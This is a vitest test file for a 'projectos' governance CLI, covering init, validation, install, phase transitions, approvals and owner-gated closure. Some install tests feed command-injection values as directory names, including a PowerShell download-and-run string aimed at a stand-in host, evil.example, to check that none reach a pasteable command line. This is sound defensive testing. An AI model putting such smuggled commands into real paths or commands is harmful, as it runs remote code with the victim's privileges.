import { describe, it, expect } from 'vitest';
import type { System, ExecResult } from '../src/system.js';
import type { CommandContext } from '../src/context.js';
import { configPath, reportsDir } from '../src/context.js';
import { parseArgs, run } from '../src/cli.js';

/** In-memory System for deterministic command tests. */
class FakeSystem implements System {
  files = new Map<string, string>();
  execResponses: Record<string, ExecResult> = {};
  cwd(): string {
    return '/repo';
  }
  now(): string {
    return '2026-07-08T12:00:00.000Z';
  }
  readText(p: string): string | null {
    return this.files.has(p) ? (this.files.get(p) as string) : null;
  }
  writeText(p: string, content: string): void {
    this.files.set(p, content);
  }
  exists(p: string): boolean {
    if (this.files.has(p)) return true;
    const prefix = p.endsWith('/') ? p : p + '/';
    for (const k of this.files.keys()) if (k.startsWith(prefix)) return true;
    return false;
  }
  listDir(p: string): readonly string[] {
    const prefix = p.endsWith('/') ? p : p + '/';
    const out = new Set<string>();
    for (const k of this.files.keys()) {
      if (k.startsWith(prefix)) {
        const name = k.slice(prefix.length).split('/')[0];
        if (name) out.add(name);
      }
    }
    return [...out];
  }
  exec(cmd: string, args: readonly string[]): ExecResult {
    const key = [cmd, ...args].join(' ');
    return this.execResponses[key] ?? { code: 1, stdout: '', stderr: 'not mocked' };
  }
}

function makeCtx(): { ctx: CommandContext; sys: FakeSystem } {
  const sys = new FakeSystem();
  sys.execResponses['git rev-parse --abbrev-ref HEAD'] = { code: 0, stdout: 'projectos-v2-core\n', stderr: '' };
  sys.execResponses['git remote get-url origin'] = {
    code: 0,
    stdout: 'https://github.com/universalbizcomply/ProjectOS.git\n',
    stderr: '',
  };
  return { ctx: { sys, root: '/repo' }, sys };
}

describe('parseArgs', () => {
  it('splits command, value flags, and boolean flags', () => {
    const p = parseArgs(['init', '--id', 'polygo', '--force']);
    expect(p.command).toBe('init');
    expect(p.flags['id']).toBe('polygo');
    expect(p.flags['force']).toBe(true);
  });
  it('defaults to help with no args', () => {
    expect(parseArgs([]).command).toBe('help');
  });
});

describe('run: help / version / unknown', () => {
  it('help exits 0', () => {
    const { ctx } = makeCtx();
    const r = run(ctx, ['help']);
    expect(r.code).toBe(0);
    expect(r.lines[0]).toContain('projectos');
  });
  it('version reports both versions', () => {
    const { ctx } = makeCtx();
    const r = run(ctx, ['version']);
    expect(r.code).toBe(0);
    expect(r.lines[0]).toContain('core');
  });
  it('unknown command exits 1 with help', () => {
    const { ctx } = makeCtx();
    const r = run(ctx, ['frobnicate']);
    expect(r.code).toBe(1);
    expect(r.lines[0]).toContain('Unknown command');
  });
});

describe('init + status + validate round trip', () => {
  it('init writes a valid config that status and validate accept', () => {
    const { ctx, sys } = makeCtx();
    const initR = run(ctx, ['init', '--id', 'polygo', '--name', 'PolyGo']);
    expect(initR.code).toBe(0);
    expect(sys.files.has(configPath('/repo'))).toBe(true);

    const statusR = run(ctx, ['status']);
    expect(statusR.code).toBe(0);
    expect(statusR.lines.join('\n')).toContain('PolyGo (polygo)');
    expect(statusR.lines.join('\n')).toContain('protected branch: no');

    const valR = run(ctx, ['validate']);
    expect(valR.code).toBe(0);
    expect(valR.lines[0]).toContain('valid project-config');
  });

  it('init requires --id', () => {
    const { ctx } = makeCtx();
    expect(run(ctx, ['init']).code).toBe(1);
  });

  it('init refuses to overwrite without --force, allows with it', () => {
    const { ctx } = makeCtx();
    run(ctx, ['init', '--id', 'a']);
    expect(run(ctx, ['init', '--id', 'a']).code).toBe(2);
    expect(run(ctx, ['init', '--id', 'a', '--force']).code).toBe(0);
  });

  it('status reports missing config', () => {
    const { ctx } = makeCtx();
    const r = run(ctx, ['status']);
    expect(r.lines.join('\n')).toContain('no .projectops');
  });

  it('validate fails on invalid JSON', () => {
    const { ctx, sys } = makeCtx();
    sys.files.set(configPath('/repo'), '{ not json');
    expect(run(ctx, ['validate']).code).toBe(1);
  });

  it('status flags protected branch on main', () => {
    const { ctx, sys } = makeCtx();
    sys.execResponses['git rev-parse --abbrev-ref HEAD'] = { code: 0, stdout: 'main\n', stderr: '' };
    run(ctx, ['init', '--id', 'x']);
    expect(run(ctx, ['status']).lines.join('\n')).toContain('protected branch: YES');
  });
});

describe('validate edge cases', () => {
  it('fails when no config exists', () => {
    const { ctx } = makeCtx();
    const r = run(ctx, ['validate']);
    expect(r.code).toBe(1);
    expect(r.lines[0]).toContain('No config');
  });
  it('fails when the generated-shape config is semantically invalid', () => {
    const { ctx, sys } = makeCtx();
    sys.files.set(configPath('/repo'), JSON.stringify({ projectId: '' }));
    expect(run(ctx, ['validate']).code).toBe(1);
  });
  it('--framework shells out and reports the exit code', () => {
    const { ctx, sys } = makeCtx();
    run(ctx, ['init', '--id', 'x']);
    sys.execResponses['npm run validate'] = { code: 0, stdout: 'a\nb\nvalidate-all: ALL PASS\n', stderr: '' };
    const r = run(ctx, ['validate', '--framework']);
    expect(r.code).toBe(0);
    expect(r.lines.join('\n')).toContain('framework validators: exit 0');
    expect(r.lines.join('\n')).toContain('ALL PASS');
  });
  it('--framework surfaces a non-zero framework exit', () => {
    const { ctx, sys } = makeCtx();
    run(ctx, ['init', '--id', 'x']);
    sys.execResponses['npm run validate'] = { code: 1, stdout: 'FAIL', stderr: '' };
    expect(run(ctx, ['validate', '--framework']).code).toBe(1);
  });
});

describe('status when git is unavailable', () => {
  it('shows unknown branch and no origin', () => {
    const { ctx, sys } = makeCtx();
    sys.execResponses['git rev-parse --abbrev-ref HEAD'] = { code: 1, stdout: '', stderr: 'no git' };
    sys.execResponses['git remote get-url origin'] = { code: 1, stdout: '', stderr: 'no origin' };
    const r = run(ctx, ['status']);
    const text = r.lines.join('\n');
    expect(text).toContain('branch: (unknown)');
    expect(text).toContain('(no origin)');
  });
  it('reports invalid JSON config', () => {
    const { ctx, sys } = makeCtx();
    sys.files.set(configPath('/repo'), '{bad');
    const r = run(ctx, ['status']);
    expect(r.code).toBe(1);
    expect(r.lines.join('\n')).toContain('INVALID JSON');
  });
  it('reports a structurally invalid config', () => {
    const { ctx, sys } = makeCtx();
    sys.files.set(configPath('/repo'), JSON.stringify({ projectId: 'x' }));
    const r = run(ctx, ['status']);
    expect(r.code).toBe(1);
    expect(r.lines.join('\n')).toContain('project-config: INVALID');
  });
});

describe('prompt', () => {
  it('renders to stdout and requires --phase', () => {
    const { ctx } = makeCtx();
    expect(run(ctx, ['prompt']).code).toBe(1);
    const r = run(ctx, ['prompt', '--phase', 'X1A', '--project', 'PolyGo']);
    expect(r.code).toBe(0);
    expect(r.lines.join('\n')).toContain('PHASE: X1A');
  });
  it('writes to a file with --out', () => {
    const { ctx, sys } = makeCtx();
    const r = run(ctx, ['prompt', '--phase', 'X1A', '--out', '/repo/p.txt']);
    expect(r.code).toBe(0);
    expect(sys.files.get('/repo/p.txt')).toContain('PHASE: X1A');
  });
});

describe('report', () => {
  it('lists nothing, then writes and lists a skeleton', () => {
    const { ctx } = makeCtx();
    expect(run(ctx, ['report']).lines.join('\n')).toContain('No reports');
    const w = run(ctx, ['report', '--phase', 'X1A', '--project', 'ProjectOS']);
    expect(w.code).toBe(0);
    const expected = `${reportsDir('/repo')}/2026-07-08_ProjectOS_X1A_AWAITING-REVIEW.md`;
    expect(w.lines.join('\n')).toContain(expected);
    const list = run(ctx, ['report']);
    expect(list.lines.join('\n')).toContain('1 awaiting');
  });
  it('refuses to overwrite an existing report without --force', () => {
    const { ctx } = makeCtx();
    run(ctx, ['report', '--phase', 'X1A']);
    expect(run(ctx, ['report', '--phase', 'X1A']).code).toBe(2);
  });
});

describe('install', () => {
  it('installs a config-only .projectops into a target, detecting the remote', () => {
    const { ctx, sys } = makeCtx();
    sys.execResponses['git -C /proj remote get-url origin'] = {
      code: 0,
      stdout: 'https://github.com/universalbizcomply/thing.git\n',
      stderr: '',
    };
    const r = run(ctx, ['install', '--target', '/proj', '--id', 'bizcomply', '--name', 'BizComply V2']);
    expect(r.code).toBe(0);
    expect(sys.files.has(configPath('/proj'))).toBe(true);
    const cfg = JSON.parse(sys.files.get(configPath('/proj')) as string);
    expect(cfg.installStatus).toBe('installed');
    expect(cfg.productionFreeze).toBe(true);
    expect(cfg.repo).toBe('universalbizcomply/thing');
    expect(sys.files.has('/proj/.projectops/README.md')).toBe(true);
  });

  it('falls back to repo=none when there is no origin', () => {
    const { ctx, sys } = makeCtx();
    // no exec response mocked -> code 1 -> none
    run(ctx, ['install', '--target', '/proj', '--id', 'x']);
    const cfg = JSON.parse(sys.files.get(configPath('/proj')) as string);
    expect(cfg.repo).toBe('none');
  });

  it('requires --target and --id', () => {
    const { ctx } = makeCtx();
    expect(run(ctx, ['install', '--id', 'x']).code).toBe(1);
    expect(run(ctx, ['install', '--target', '/proj']).code).toBe(1);
  });

  /**
   * REGISTRATION IS OUT OF BAND, and this command says so rather than doing it.
   *
   * `projectos install` runs as the owner, unelevated. The installed ProjectOS keeps its project
   * list in protected machine configuration that ordinary users may read and not write, so this
   * command cannot register anything — it prints the administrator's next step instead.
   */
  it('points at the administrator registration command and performs no registration', () => {
    const { ctx, sys } = makeCtx();
    const r = run(ctx, ['install', '--target', '/proj', '--id', 'bizcomply']);
    const text = r.lines.join(String.fromCharCode(10));

    expect(text).toContain('projectos-register-project plan');
    expect(text).toContain('an administrator registers it once');
    expect(text).toContain('id             bizcomply');
    expect(text).toContain('root           /proj');
    // It performs nothing itself. It never emits an INVOCABLE publish command, and never names the
    // protected destination — telling a reader where the file is tells them where to put one.
    expect(text).not.toContain('projectos-register-project publish');
    expect(text).not.toContain('ProgramData');
    expect(text).not.toContain('projects.v1.json');
    expect(text).not.toContain('APPROVED:');
    // And it wrote only inside the target repository.
    for (const path of sys.files.keys()) {
      expect(path.startsWith('/proj')).toBe(true);
    }
  });

  /**
   * THE POINTER IS NOT A COMMAND LINE, and that is the point.
   *
   * This text is read beside an ADMINISTRATOR terminal. `$`, `(`, `)` and a backtick are all legal
   * in a Windows path, and PowerShell evaluates `$(...)` even inside double quotes — so a directory
   * named `C:\proj\$(...)` spliced into a quoted argument would execute on paste, with whatever
   * privileges that terminal holds. The values are printed as fields instead, so there is no command
   * line for them to escape from.
   */
  it('never builds a pasteable command line out of the caller id or target', () => {
    const { ctx } = makeCtx();
    const hostile = '/proj/$(whoami)';
    const r = run(ctx, ['install', '--target', hostile, '--id', 'a"b`c$d']);
    const text = r.lines.join(String.fromCharCode(10));

    // The values appear, as fields — never inside a quoted argument on a runnable line.
    expect(text).toContain('root           ' + hostile);
    expect(text).not.toContain('--root "');
    expect(text).not.toContain('--id a"b`c$d');
    // Same non-vacuity guard as below: `startsWith` stopped matching when the guidance was reworded,
    // so this loop needs to prove it still sees the line it is judging.
    const naming = r.lines.filter((l) => l.includes('projectos-register-project'));
    expect(naming.length).toBeGreaterThan(0);
    for (const line of naming) {
      expect(line).not.toContain(hostile);
      expect(line).not.toContain('a"b`c$d');
    }
  });

  it('strips control characters from the values it prints', () => {
    const { ctx } = makeCtx();
    const r = run(ctx, [
      'install',
      '--target',
      '/proj',
      '--id',
      'ok' + String.fromCharCode(10) + '  frozen         false',
    ]);
    const text = r.lines.join(String.fromCharCode(10));
    // A newline in a value could otherwise forge a line and make the instructions say something
    // they do not.
    expect(text).toContain('id             ok  frozen         false');
    expect(r.lines.filter((l) => l.trim().startsWith('frozen'))).toHaveLength(1);
  });

  /**
   * [J] THE TWO STEPS NEED DIFFERENT TERMINALS, AND THE TEXT SAYS SO.
   *
   * `plan` is read-only and needs no elevation; only the publication it prints writes to protected
   * machine configuration. Telling an owner to open an Administrator terminal for the read-only step
   * teaches them to run the whole registration elevated, which is exactly the habit that makes a
   * pasted command dangerous. Naming the SHELL matters too: the quoting the registration command
   * generates is PowerShell's.
   */
  it('pins both steps to Windows PowerShell 5.1 and excludes pwsh', () => {
    const { ctx } = makeCtx();
    const r = run(ctx, ['install', '--target', '/proj', '--id', 'bizcomply']);

    // [A] The read-only step: named version, named executable, explicitly unelevated.
    const planStep = r.lines.find((l) => l.includes('unelevated'));
    expect(planStep).toBeDefined();
    expect(planStep).toContain('Windows PowerShell 5.1');
    expect(planStep).toContain('powershell.exe');
    expect(planStep).not.toContain('Administrator');

    // [B] The write step: same version and executable, and elevation this time.
    const writeStep = r.lines.find((l) => l.includes('Administrator'));
    expect(writeStep).toBeDefined();
    expect(writeStep).toContain('Windows PowerShell 5.1');
    expect(writeStep).toContain('powershell.exe');

    // [C] pwsh appears only to be excluded — never as a supported alternative.
    const pwshLines = r.lines.filter((l) => l.includes('pwsh') || l.includes('PowerShell 7'));
    expect(pwshLines.length).toBeGreaterThan(0);
    for (const line of pwshLines) {
      expect(line).toContain('not supported');
    }
  });

  /**
   * [I] AND THE ELEVATED STEP IS STILL NOT SPELLED OUT AS A RUNNABLE COMMAND HERE.
   *
   * The registration command generates that line itself, from values it has re-read and validated,
   * with PowerShell single-quoted literals. This command has neither the digest nor the validated
   * root, so anything it printed would be a second, weaker encoding of the same instruction — and
   * the caller's `--target` is unvalidated text at this point.
   */
  it('never emits a runnable publish command containing the caller target', () => {
    const { ctx } = makeCtx();
    const hostile = '/proj/$(iwr evil.example|iex)';
    const r = run(ctx, ['install', '--target', hostile, '--id', 'bizcomply']);

    // The lines that NAME the command are the only ones a reader could mistake for something to
    // paste. Gating on the word "publish" would be worse than useless: this same change removed
    // that word from the output, so the filter would match nothing and every assertion below would
    // silently stop running.
    const naming = r.lines.filter((l) => l.includes('projectos-register-project'));
    expect(naming.length).toBeGreaterThan(0);

    for (const line of naming) {
      expect(line).not.toContain(hostile);
      expect(line).not.toContain('--root');
      expect(line).not.toContain('--id');
    }
    expect(r.lines.join(String.fromCharCode(10))).not.toContain('--expect-digest');
  });

  it('refuses to overwrite an existing install without --force', () => {
    const { ctx } = makeCtx();
    run(ctx, ['install', '--target', '/proj', '--id', 'x']);
    expect(run(ctx, ['install', '--target', '/proj', '--id', 'x']).code).toBe(2);
    expect(run(ctx, ['install', '--target', '/proj', '--id', 'x', '--force']).code).toBe(0);
  });
});

/**
 * Governed phase work now requires a governed context — a project config plus that project's own
 * approved, READY plan (PROJECTOS-V3-POLYGO-PILOT1A). These tests predate that gate and used to run
 * with no `.projectops` at all, so they seed the real ProjectOS config shape and ProjectOS's own
 * accepted plan rather than a literal, which keeps them honest against the shipped schema.
 */
function makeGovernedCtx(): { ctx: CommandContext; sys: FakeSystem } {
  const { ctx, sys } = makeCtx();
  const fs = require('node:fs') as typeof import('node:fs');
  const path = require('node:path') as typeof import('node:path');
  const plan = fs.readFileSync(path.resolve(__dirname, '../../state/projectos-v3.plan.json'), 'utf8');
  sys.files.set(
    configPath('/repo'),
    JSON.stringify({
      projectId: 'projectos',
      projectName: 'ProjectOS',
      projectType: 'saas',
      owner: 'Murad',
      repo: 'universalbizcomply/ProjectOS',
      localPath: 'C:/dev/ProjectOS',
      protectedBranches: ['main'],
      productionFreeze: true,
      allowedActions: ['create-local-files'],
      forbiddenActions: ['production-deploy'],
      approvalGates: ['phase-closure'],
      secretsPolicy: { allowSecretsInRepo: false, redactionRequired: true },
      validators: ['validators/val-*.cjs'],
      evidenceRequirements: ['evidence-pack'],
      installStatus: 'installed',
    }),
  );
  sys.files.set('/repo/.projectops/plan.json', plan);
  return { ctx, sys };
}

describe('phase runtime', () => {
  it('new creates a persisted draft phase', () => {
    const { ctx, sys } = makeGovernedCtx();
    const r = run(ctx, ['phase', 'new', '--id', 'PROJECTOS-V3-BASELINE-RECONCILE1A', '--project', 'ProjectOS']);
    expect(r.code).toBe(0);
    expect(r.lines.join('\n')).toContain('status: draft');
    expect(sys.exists('/repo/.projectops/phases/PROJECTOS-V3-BASELINE-RECONCILE1A.json')).toBe(true);
  });

  it('new requires --id and refuses overwrite without --force', () => {
    const { ctx } = makeGovernedCtx();
    expect(run(ctx, ['phase', 'new']).code).toBe(1);
    run(ctx, ['phase', 'new', '--id', 'PROJECTOS-V3-BASELINE-RECONCILE1A']);
    expect(run(ctx, ['phase', 'new', '--id', 'PROJECTOS-V3-BASELINE-RECONCILE1A']).code).toBe(2);
    expect(run(ctx, ['phase', 'new', '--id', 'PROJECTOS-V3-BASELINE-RECONCILE1A', '--force']).code).toBe(0);
  });

  it('advances along the happy path and records history', () => {
    const { ctx } = makeGovernedCtx();
    run(ctx, ['phase', 'new', '--id', 'PROJECTOS-V3-BASELINE-RECONCILE1A']);
    for (const to of ['prompted', 'implementing', 'validating', 'evidence', 'awaiting_review', 'awaiting_closure']) {
      const r = run(ctx, ['phase', 'advance', '--id', 'PROJECTOS-V3-BASELINE-RECONCILE1A', '--to', to]);
      expect(r.code).toBe(0);
    }
    const show = run(ctx, ['phase', 'show', '--id', 'PROJECTOS-V3-BASELINE-RECONCILE1A']);
    expect(show.lines.join('\n')).toContain('status:    awaiting_closure');
    expect(show.lines.join('\n')).toContain('-> prompted');
  });

  it('rejects illegal transitions with exit 1', () => {
    const { ctx } = makeGovernedCtx();
    run(ctx, ['phase', 'new', '--id', 'PROJECTOS-V3-BASELINE-RECONCILE1A']);
    const r = run(ctx, ['phase', 'advance', '--id', 'PROJECTOS-V3-BASELINE-RECONCILE1A', '--to', 'closed', '--as', 'owner']);
    expect(r.code).toBe(1);
    expect(r.lines.join('\n')).toContain('Illegal transition');
  });

  it('blocks non-owner closure with exit 2 but allows owner', () => {
    const { ctx } = makeGovernedCtx();
    run(ctx, ['phase', 'new', '--id', 'PROJECTOS-V3-BASELINE-RECONCILE1A']);
    for (const to of ['prompted', 'implementing', 'validating', 'evidence', 'awaiting_review', 'awaiting_closure']) {
      run(ctx, ['phase', 'advance', '--id', 'PROJECTOS-V3-BASELINE-RECONCILE1A', '--to', to]);
    }
    const blocked = run(ctx, ['phase', 'advance', '--id', 'PROJECTOS-V3-BASELINE-RECONCILE1A', '--to', 'closed', '--as', 'implementer']);
    expect(blocked.code).toBe(2);
    // The refusal is now the specific authority code rather than the generic role message: the
    // implementer is refused by the closure-authority decision BEFORE the state machine is reached.
    expect(blocked.lines.join('\n')).toContain('IMPLEMENTER_CANNOT_CLOSE');
    // The advisor is refused too, unless the approved plan delegates to that exact identity.
    const noIdentity = run(ctx, ['phase', 'advance', '--id', 'PROJECTOS-V3-BASELINE-RECONCILE1A', '--to', 'closed', '--as', 'advisor']);
    expect(noIdentity.code).toBe(2);
    expect(noIdentity.lines.join('\n')).toContain('ACTOR_IDENTITY_MISSING');
    const wrongIdentity = run(ctx, ['phase', 'advance', '--id', 'PROJECTOS-V3-BASELINE-RECONCILE1A', '--to', 'closed', '--as', 'advisor', '--identity', 'Someone Else']);
    expect(wrongIdentity.code).toBe(2);
    expect(wrongIdentity.lines.join('\n')).toContain('DELEGATION_WRONG_ACTOR');
    // AND THE OWNER IS REFUSED TOO, without a decision. `--as owner` is a caller-supplied string, so
    // before the Phase-18 correction typing it was sufficient on its own — no gate, no decision.
    // Closure now requires a committed decision naming the recorded authority, whichever basis is
    // claimed; the legitimate owner path is proven in closureAuthorityBreach.test.ts R7.
    const owned = run(ctx, ['phase', 'advance', '--id', 'PROJECTOS-V3-BASELINE-RECONCILE1A', '--to', 'closed', '--as', 'owner', '--note', 'accepted']);
    expect(owned.code).toBe(2);
    expect(owned.lines.join('\n')).toContain('GATEKEEPER_DECISION_MISSING');
    expect(run(ctx, ['phase', 'show', '--id', 'PROJECTOS-V3-BASELINE-RECONCILE1A']).lines.join('\n')).toContain('awaiting_closure');
  });

  it('validates flags and status names', () => {
    const { ctx } = makeGovernedCtx();
    run(ctx, ['phase', 'new', '--id', 'PROJECTOS-V3-BASELINE-RECONCILE1A']);
    expect(run(ctx, ['phase', 'advance', '--id', 'PROJECTOS-V3-BASELINE-RECONCILE1A']).code).toBe(1);
    expect(run(ctx, ['phase', 'advance', '--id', 'PROJECTOS-V3-BASELINE-RECONCILE1A', '--to', 'bogus']).code).toBe(1);
    expect(run(ctx, ['phase', 'advance', '--id', 'PROJECTOS-V3-BASELINE-RECONCILE1A', '--to', 'prompted', '--as', 'wizard']).code).toBe(1);
    expect(run(ctx, ['phase', 'advance', '--id', 'MISSING', '--to', 'prompted']).code).toBe(1);
  });

  it('list and show handle empty/missing gracefully', () => {
    const { ctx, sys } = makeGovernedCtx();
    expect(run(ctx, ['phase', 'list']).lines.join('\n')).toContain('No phases');
    expect(run(ctx, ['phase', 'show', '--id', 'X']).code).toBe(1);
    run(ctx, ['phase', 'new', '--id', 'PROJECTOS-V3-BASELINE-RECONCILE1A']);
    // The second approved phase depends on the first, so record that one closed before creating it.
    sys.files.set(
      '/repo/.projectops/phases/PROJECTOS-V3-BASELINE-RECONCILE1A.json',
      JSON.stringify({
        phaseId: 'PROJECTOS-V3-BASELINE-RECONCILE1A',
        project: 'ProjectOS',
        objective: 'x',
        status: 'closed',
        // Dependency evidence requires the real closure AND the decision that authorised it — a
        // role string alone is something anyone able to write this record could also write.
        history: [
          {
            from: 'awaiting_closure',
            to: 'closed',
            by: 'owner',
            at: '2026-08-09T00:00:00Z',
            note: 'closed by the owner, decision BASELINE-CLOSURE1A',
          },
        ],
      }),
    );
    sys.files.set(
      '/repo/.projectops/closure/decisions/PROJECTOS-V3-BASELINE-RECONCILE1A.json',
      JSON.stringify({
        schemaVersion: '1.0.0',
        decisionId: 'BASELINE-CLOSURE1A',
        phaseId: 'PROJECTOS-V3-BASELINE-RECONCILE1A',
        projectId: 'projectos',
        scope: 'phase-closure',
        decidedBy: 'Murad',
        decidedAt: '2026-08-09T00:00:00Z',
        evidenceSubjectHead: 'a'.repeat(40),
        decision: 'close',
        consumedAt: '2026-08-09T00:05:00Z',
      }),
    );
    run(ctx, ['phase', 'new', '--id', 'PROJECTOS-V3-MASTER-PLAN-MEMORY1A']);
    expect(run(ctx, ['phase', 'list']).lines.join('\n')).toContain('2 phase(s)');
  });

  it('rejects unknown subcommands', () => {
    const { ctx } = makeGovernedCtx();
    expect(run(ctx, ['phase', 'frob']).code).toBe(1);
  });
});

/**
 * R17-2: the approval loop is a governed mutation and is now gated like `phase`. These tests use the
 * governed context for the same reason the phase tests do — an approval decided in a checkout whose
 * plan is for another project is exactly what the gate exists to refuse, and is asserted below.
 */
describe('approve loop', () => {
  it('gated request must be decided by owner; non-owner blocked (exit 2)', () => {
    const { ctx } = makeGovernedCtx();
    const req = run(ctx, ['approve', 'request', '--id', 'A1', '--action', 'production deploy']);
    expect(req.code).toBe(0);
    expect(req.lines.join('\n')).toContain('gated:      true');
    const blocked = run(ctx, ['approve', 'decide', '--id', 'A1', '--decision', 'approved', '--as', 'implementer']);
    expect(blocked.code).toBe(2);
    const owned = run(ctx, ['approve', 'decide', '--id', 'A1', '--decision', 'approved', '--as', 'owner', '--note', 'ok']);
    expect(owned.code).toBe(0);
    expect(run(ctx, ['approve', 'show', '--id', 'A1']).lines.join('\n')).toContain('state:      approved');
  });

  it('prohibited action needs --override even for owner', () => {
    const { ctx } = makeGovernedCtx();
    run(ctx, ['approve', 'request', '--id', 'FP', '--action', 'force push to main']);
    expect(run(ctx, ['approve', 'decide', '--id', 'FP', '--decision', 'approved', '--as', 'owner']).code).toBe(2);
    expect(run(ctx, ['approve', 'decide', '--id', 'FP', '--decision', 'approved', '--as', 'owner', '--override']).code).toBe(0);
  });

  it('ungated action can be self-decided by the requester', () => {
    const { ctx } = makeGovernedCtx();
    run(ctx, ['approve', 'request', '--id', 'R1', '--action', 'refactor a helper', '--as', 'implementer']);
    expect(run(ctx, ['approve', 'decide', '--id', 'R1', '--decision', 'approved', '--as', 'implementer']).code).toBe(0);
  });

  it('validates flags and missing records', () => {
    const { ctx } = makeGovernedCtx();
    expect(run(ctx, ['approve', 'request', '--id', 'X']).code).toBe(1);
    expect(run(ctx, ['approve', 'request', '--action', 'x']).code).toBe(1);
    expect(run(ctx, ['approve', 'decide', '--id', 'X', '--decision', 'maybe', '--as', 'owner']).code).toBe(1);
    expect(run(ctx, ['approve', 'decide', '--id', 'MISSING', '--decision', 'approved', '--as', 'owner']).code).toBe(1);
  });

  it('R17-2 an approval cannot be minted or decided outside a governed context', () => {
    // No config, no plan: `phase` has refused this since Phase 16 and `approve` did not.
    const { ctx: ungoverned } = makeCtx();
    const minted = run(ungoverned, ['approve', 'request', '--id', 'A1', '--action', 'production deploy']);
    expect(minted.code).toBe(2);
    expect(minted.lines.join(' ')).toContain('NO_CONFIG');
    expect(run(ungoverned, ['approve', 'decide', '--id', 'A1', '--decision', 'approved', '--as', 'owner']).code).toBe(2);

    // A plan for another project cannot govern approvals in this checkout either.
    const { ctx, sys } = makeGovernedCtx();
    const cfg = JSON.parse(sys.files.get(configPath('/repo')) as string) as Record<string, unknown>;
    sys.files.set(configPath('/repo'), JSON.stringify({ ...cfg, projectId: 'polygo' }));
    const wrong = run(ctx, ['approve', 'request', '--id', 'A2', '--action', 'production deploy']);
    expect(wrong.code).toBe(2);
    expect(wrong.lines.join(' ')).toContain('WRONG_PROJECT');
  });

  it('R17-2 reading approvals stays ungated', () => {
    // Refusing to READ a record because the plan went stale would hide the records an operator needs
    // in order to fix it. Only the mutations are gated.
    const { ctx } = makeCtx();
    expect(run(ctx, ['approve', 'list']).code).toBe(0);
    expect(run(ctx, ['approve', 'show', '--id', 'NOPE']).code).toBe(1);
  });

  it('refuses duplicate request without --force; list/show handle empty', () => {
    const { ctx } = makeGovernedCtx();
    expect(run(ctx, ['approve', 'list']).lines.join('\n')).toContain('No approvals');
    run(ctx, ['approve', 'request', '--id', 'A1', '--action', 'deploy to prod']);
    expect(run(ctx, ['approve', 'request', '--id', 'A1', '--action', 'x']).code).toBe(2);
    expect(run(ctx, ['approve', 'list']).lines.join('\n')).toContain('1 approval(s)');
    expect(run(ctx, ['approve', 'frob']).code).toBe(1);
    expect(run(ctx, ['approve', 'show', '--id', 'NOPE']).code).toBe(1);
  });
});

describe('plugins', () => {
  it('lists the inert catalog with external flags', () => {
    const { ctx } = makeCtx();
    const r = run(ctx, ['plugins']);
    expect(r.code).toBe(0);
    const text = r.lines.join('\n');
    expect(text).toContain('Integration catalog');
    expect(text).toContain('supabase');
    expect(text).toContain('external (owner-gated)');
  });
});

describe('plan', () => {
  it('shows the execution plan with owner-gated closure', () => {
    const { ctx } = makeCtx();
    const r = run(ctx, ['plan']);
    expect(r.code).toBe(0);
    const text = r.lines.join('\n');
    expect(text).toContain('Execution plan');
    expect(text).toContain('Claude Code');
    expect(text).toContain('owner-gated');
  });
});

describe('close (owner-gated)', () => {
  it('refuses by default with exit 2', () => {
    const { ctx } = makeCtx();
    const r = run(ctx, ['close', '--phase', 'X1A']);
    expect(r.code).toBe(2);
    expect(r.lines.join('\n')).toContain('OWNER-GATED');
  });
  it('acknowledges owner confirmation but changes nothing', () => {
    const { ctx, sys } = makeCtx();
    const before = sys.files.size;
    const r = run(ctx, ['close', '--phase', 'X1A', '--as', 'owner', '--confirm']);
    expect(r.code).toBe(0);
    expect(sys.files.size).toBe(before);
  });
  it('requires --phase', () => {
    const { ctx } = makeCtx();
    expect(run(ctx, ['close']).code).toBe(1);
  });
});
